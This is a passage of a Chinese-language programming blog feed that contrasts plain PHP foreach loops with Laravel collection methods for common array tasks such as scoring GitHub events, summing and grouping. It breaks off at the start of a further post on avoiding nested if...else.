class="line">var_dump($res);</span><br></pre></td></tr></table></figure></li><li><p>使用集合的map以及php 的explode、end：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$res = collect($gates)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($gate)</span> </span>&#123;</span><br><span class="line">    $parts = explode(<span class="string">'_'</span>, $gate);</span><br><span class="line">    <span class="keyword">return</span> end($parts);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>使用集合的map、explode、last、toArray：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$res = collect($gates)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($gate)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> collect(explode(<span class="string">'_'</span>, $gate))-&gt;last();</span><br><span class="line">&#125;)-&gt;toArray();</span><br></pre></td></tr></table></figure></li></ol><p>explode：将字符串进行分割成数组<br>last：获取最后一个元素</p><h2 id="统计GitHub-Event"><a href="#统计GitHub-Event" class="headerlink" title="统计GitHub Event"></a>统计GitHub Event</h2><p>首先，通过此<a href="https://api.github.com/users/YOUR_USRE_NAME/events" target="_blank" rel="noopener">链接</a>获取到个人事件json。</p><p>一个 <code>PushEvent计</code> 5 分，一个 <code>CreateEvent</code> 计 4 分，一个 <code>IssueCommentEvent计</code> 3 分，一个 <code>IssueCommentEvent</code> 计 2 分，除此之外的其它类型的事件计 1 分，计算当前用户的时间得分总和。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$opts = [</span><br><span class="line">        <span class="string">'http'</span> =&gt; [</span><br><span class="line">                <span class="string">'method'</span> =&gt; <span class="string">'GET'</span>,</span><br><span class="line">                <span class="string">'header'</span> =&gt; [</span><br><span class="line">                        <span class="string">'User-Agent: PHP'</span></span><br><span class="line">                ]</span><br><span class="line">        ]</span><br><span class="line">];</span><br><span class="line">$context = stream_context_create($opts);</span><br><span class="line">$events = json_decode(file_get_contents(<span class="string">'http://api.github.com/users/0xAiKang/events'</span>, <span class="keyword">false</span>, $context), <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><ol><li>传统foreach 方式：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$eventTypes = []; <span class="comment">// 事件类型</span></span><br><span class="line">$score = <span class="number">0</span>; <span class="comment">// 总得分</span></span><br><span class="line"><span class="keyword">foreach</span> ($events <span class="keyword">as</span> $event) &#123;</span><br><span class="line">    $eventTypes[] = $event[<span class="string">'type'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($eventTypes <span class="keyword">as</span> $eventType) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ($eventType) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'PushEvent'</span>:</span><br><span class="line">        $score += <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'CreateEvent'</span>:</span><br><span class="line">        $score += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'IssueEvent'</span>:</span><br><span class="line">        $score += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'IssueCommentEvent'</span>:</span><br><span class="line">        $score += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        $score += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>使用集合的map、pluck、sum 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$score = $events-&gt;pluck(<span class="string">'type'</span>)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($eventType)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> ($eventType) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'PushEvent'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'CreateEvent'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'IssueEvent'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'IssueCommentEvent'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)-&gt;sum();</span><br></pre></td></tr></table></figure><p>使用集合的链式编程，可以很好地解决上面那种多次遍历的问题。</p></li><li><p>使用集合中的map、pluck、get 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$score = $events-&gt;pluck(<span class="string">'type'</span>)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($eventType)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> collect([</span><br><span class="line">       <span class="string">'PushEvent'</span>=&gt; <span class="number">5</span>,</span><br><span class="line">       <span class="string">'CreateEvent'</span>=&gt; <span class="number">4</span>,</span><br><span class="line">       <span class="string">'IssueEvent'</span>=&gt; <span class="number">3</span>,</span><br><span class="line">       <span class="string">'IssueCommentEvent'</span>=&gt; <span class="number">2</span></span><br><span class="line">   ])-&gt;get($eventType, <span class="number">1</span>); <span class="comment">// 如果不存在则默认等于1</span></span><br><span class="line">&#125;)-&gt;sum();</span><br></pre></td></tr></table></figure></li><li><p>尝试将该需求，封装成一个类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GithubScore</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $events;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">score</span><span class="params">($events)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">static</span>($events))-&gt;scoreEvents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">scoreEvents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;events-&gt;pluck(<span class="string">'type'</span>)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($eventType)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;lookupEventScore($eventType, <span class="number">1</span>);</span><br><span class="line">        &#125;)-&gt;sum();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">lookupEventScore</span><span class="params">($eventType, $default_value)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> collect([</span><br><span class="line">           <span class="string">'PushEvent'</span>=&gt; <span class="number">5</span>,</span><br><span class="line">           <span class="string">'CreateEvent'</span>=&gt; <span class="number">4</span>,</span><br><span class="line">           <span class="string">'IssueEvent'</span>=&gt; <span class="number">3</span>,</span><br><span class="line">           <span class="string">'IssueCommentEvent'</span>=&gt; <span class="number">2</span></span><br><span class="line">       ])-&gt;get($eventType, $default_value); <span class="comment">// 如果不存在则默认等于1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(GithubScore::score($events));</span><br></pre></td></tr></table></figure></li></ol><h2 id="格式化数据-1"><a href="#格式化数据-1" class="headerlink" title="格式化数据"></a>格式化数据</h2><blockquote><p>需求：将以下数据格式化成新的结构。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$messages = [</span><br><span class="line">    <span class="string">'Should be working now for all Providers.'</span>,</span><br><span class="line">    <span class="string">'If you see one where spaces are in the title let me know.'</span>,</span><br><span class="line">    <span class="string">'But there should not have blank in the key of config or .env file.'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化之后的结果</span></span><br><span class="line">- Should be working now <span class="keyword">for</span> all Providers. \n</span><br><span class="line">- <span class="keyword">If</span> you see one where spaces are in the title let me know. \n</span><br><span class="line">- But there should not have blank in the key of config <span class="keyword">or</span> .env file.</span><br></pre></td></tr></table></figure><ol><li><p>传统的foreach 方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$comment = <span class="string">'- '</span> . array_shift($messages);</span><br><span class="line"><span class="keyword">foreach</span> ($messages <span class="keyword">as</span> $message) &#123;</span><br><span class="line">    $comment .= <span class="string">"\n -  $&#123;message&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($comment);</span><br></pre></td></tr></table></figure></li><li><p>使用集合的map、implode方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$comment = collect($messages)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($message)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'- '</span> . $message;</span><br><span class="line">&#125;)-&gt;implode(<span class="string">"\n"</span>);</span><br><span class="line">var_dump($comment);</span><br></pre></td></tr></table></figure></li></ol><h2 id="多个数组求差"><a href="#多个数组求差" class="headerlink" title="多个数组求差"></a>多个数组求差</h2><blockquote><p>需求：两组数据分别代表去年的营收和今年的营收，求每个月的盈亏情况。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$lastYear = [</span><br><span class="line">    <span class="number">6345.75</span>,</span><br><span class="line">    <span class="number">9839.45</span>,</span><br><span class="line">    <span class="number">7134.60</span>,</span><br><span class="line">    <span class="number">9479.50</span>,</span><br><span class="line">    <span class="number">9928.0</span>,</span><br><span class="line">    <span class="number">8652.00</span>,</span><br><span class="line">    <span class="number">7658.40</span>,</span><br><span class="line">    <span class="number">10245.40</span>,</span><br><span class="line">    <span class="number">7889.40</span>,</span><br><span class="line">    <span class="number">3892.40</span>,</span><br><span class="line">    <span class="number">3638.40</span>,</span><br><span class="line">    <span class="number">2339.40</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$thisYear = [</span><br><span class="line">    <span class="number">6145.75</span>,</span><br><span class="line">    <span class="number">6895.00</span>,</span><br><span class="line">    <span class="number">3434.00</span>,</span><br><span class="line">    <span class="number">9349350</span>,</span><br><span class="line">    <span class="number">9478.60</span>,</span><br><span class="line">    <span class="number">7652.80</span>,</span><br><span class="line">    <span class="number">4758.40</span>,</span><br><span class="line">    <span class="number">10945.40</span>,</span><br><span class="line">    <span class="number">3689.40</span>,</span><br><span class="line">    <span class="number">8992.40</span>,</span><br><span class="line">    <span class="number">7588.40</span>,</span><br><span class="line">    <span class="number">2239.40</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li><p>传统的foreach 方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profit = [];</span><br><span class="line"><span class="keyword">foreach</span>($thisYear <span class="keyword">as</span> $key =&gt; $monthly)&#123;</span><br><span class="line">    $profit[$key] = $monthly - $lastYear[$key];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($profit);</span><br></pre></td></tr></table></figure></li><li><p>使用集合的zip、first、last：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$profit = collect($thisYear)-&gt;zip($lastYear)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($monthly)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $monthly-&gt;first() - $monthly-&gt;last();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>zip：将给定数组的值与相应索引处的原集合的值合并在一起。</p></li></ol><h2 id="创建lookup-数组"><a href="#创建lookup-数组" class="headerlink" title="创建lookup 数组"></a>创建lookup 数组</h2><blockquote><p>需求：将如下数组格式化成下面的结果：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$employees = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'example'</span>,</span><br><span class="line">        <span class="string">'email'</span> =&gt; <span class="string">'example@exmaple.com'</span>,</span><br><span class="line">        <span class="string">'company'</span> =&gt; <span class="string">'example Inc.'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Lucy'</span>,</span><br><span class="line">        <span class="string">'email'</span> =&gt; <span class="string">'lucy@example.com'</span>,</span><br><span class="line">        <span class="string">'company'</span> =&gt; <span class="string">'ibm Inc.'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Taylor'</span>,</span><br><span class="line">        <span class="string">'email'</span> =&gt; <span class="string">'toylor@laravel.com'</span>,</span><br><span class="line">        <span class="string">'company'</span>=&gt;<span class="string">'Laravel Inc.'</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化之后的结果</span></span><br><span class="line">$lookup = [</span><br><span class="line">    <span class="string">'example'</span> =&gt; <span class="string">'example@example.com'</span>,</span><br><span class="line">    <span class="string">'Lucy'</span> =&gt; ‘lucy@example.com’,</span><br><span class="line">    <span class="string">'Taylor'</span>=&gt; <span class="string">'toylor@laravel.com'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li><p>传统的foreach 方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$emails = [];</span><br><span class="line"><span class="keyword">foreach</span> ($employees <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $emails[$value[<span class="string">'name'</span>]] = $value[<span class="string">'email'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用集合的reduce 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$emails = collect($employees)-&gt;reduce(<span class="function"><span class="keyword">function</span><span class="params">($emailLookup, $employee)</span></span>&#123;</span><br><span class="line">    $emailLookup[$employee[<span class="string">'name'</span>]] = $employee[<span class="string">'email'</span>];</span><br><span class="line">    <span class="keyword">return</span> $emailLookup;</span><br><span class="line">&#125;,[]);</span><br></pre></td></tr></table></figure></li></ol><p>reduce：将每次迭代的结果传递给下一次迭代直到集合减少为单个值。</p><ol start="3"><li>使用集合的pluck 方法：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$emails = collect($employees)-&gt;pluck(<span class="string">'name'</span>, <span class="string">'email'</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="返回一维数组"><a href="#返回一维数组" class="headerlink" title="返回一维数组"></a>返回一维数组</h2><p>需求：将下面的二维数组，转换为一维数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$nums = [</span><br><span class="line">    [</span><br><span class="line">        <span class="number">188</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">238</span>,</span><br><span class="line">        <span class="number">383</span>,</span><br><span class="line">        <span class="number">123</span>,</span><br><span class="line">        <span class="number">348</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">348</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li>传统foreach 方式：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$result = [];</span><br><span class="line"><span class="keyword">foreach</span> ($nums <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $num) &#123;</span><br><span class="line">        $result[] = $num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用集合的flatten、map：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$result = collect($nums)-&gt;flatten(<span class="number">1</span>)-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><h2 id="求和-1"><a href="#求和-1" class="headerlink" title="求和"></a>求和</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$orders = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="string">"1000"</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">80</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="string">"1001"</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">120</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="string">"1002"</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li>传统foreach方式：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$total_price = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($orders <span class="keyword">as</span> $order) &#123;</span><br><span class="line">    $total_price += $order[<span class="string">"price"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>array 函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total_price = array_sum(array_column($orders, <span class="string">"price"</span>));</span><br></pre></td></tr></table></figure></li><li><p>使用集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式一：</span></span><br><span class="line">$total_price = collect($orders)-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'price'</span>];</span><br><span class="line">&#125;)-&gt;sum();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式二：</span></span><br><span class="line">$total_price = collect($orders)-&gt;pluck(<span class="string">"price"</span>)-&gt;sum();</span><br></pre></td></tr></table></figure></li></ol><h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$products = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"iPhone"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"iPhone 12"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"OPPO"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"OPPO R11"</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"小米"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"小米 11"</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"OPPO"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"OPPO R12"</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"小米"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"小米 10"</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>使用集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$product = collect($products)-&gt;pluck(<span class="string">"brand"</span>);</span><br><span class="line"></span><br><span class="line">$grouped = collect($products)-&gt;groupBy(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span class="line">$result = $product-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> <span class="title">use</span> <span class="params">($grouped)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">"brand"</span> =&gt; $value,</span><br><span class="line">        <span class="string">"child"</span> =&gt; $grouped[$key],</span><br><span class="line">    ];</span><br><span class="line">&#125;)-&gt;values();</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://curder.gitbooks.io/laravel_study/content/collections_demo/" target="_blank" rel="noopener">collection在实际开发中的使用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tips of PHP</title>
      <link href="/tips-of-php/"/>
      <url>/tips-of-php/</url>
      
        <content type="html"><![CDATA[<p>Awesome tips for PHP.</p><a id="more"></a><h2 id="减少if…else-的使用"><a href="#减少if…else-的使用" class="headerlink" title="减少if…else 的使用"></a>减少if…else 的使用</h2><p><code>if...else</code> 通常是一个糟糕的选择，它导致设计复杂，代码可读性差，并且可能导致重构困难。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (...) &#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; esle &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; esle &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好在可以通过其他方式可以避免对<code>if...else</code> 